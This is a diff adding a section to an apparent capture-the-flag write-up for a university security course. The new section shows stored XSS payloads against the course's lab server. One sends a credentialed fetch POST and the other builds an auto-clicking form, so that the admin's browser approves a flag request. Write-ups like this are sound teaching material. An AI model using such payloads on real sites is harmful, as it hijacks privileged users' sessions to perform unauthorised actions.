@@ -91,3 +91,41 @@ p.interactive()
 ```
 
 Running this, we were able to prompt a shell and cat the flag.
+
+## Aply for Flag II
+
+The description of the challenged mentioned the websites were separated. However, the XSS vulnerability was still there.
+Because the admin would see the justification in a different page from the admin gui, we first tried sending a POST request with `fetch` using XSS.
+
+```html
+<script type="text/javascript">
+fetch('http://ctf-fsi.fe.up.pt:5005/request/[id]/approve', {
+    method: 'POST',
+    credentials: 'include',
+    mode: 'no-cors',
+    headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ "giveflag": "Give the flag" })
+});
+</script>
+```
+
+For some reason this did not work. Then, we tried actually creating a form identical to the admin one and force a click:
+
+```html
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/[id]/approve" role="form">
+    <div class="submit">
+        
+        <input id="abc" type="submit" id="giveflag" value="Give the flag">
+        
+    </div>
+</form>
+<script type="text/javascript">
+document.querySelector('#abc').click()
+</script>
+```
+
+After disabling js in the browser (to avoid running the script ourselves), we were able to get the flag.
+
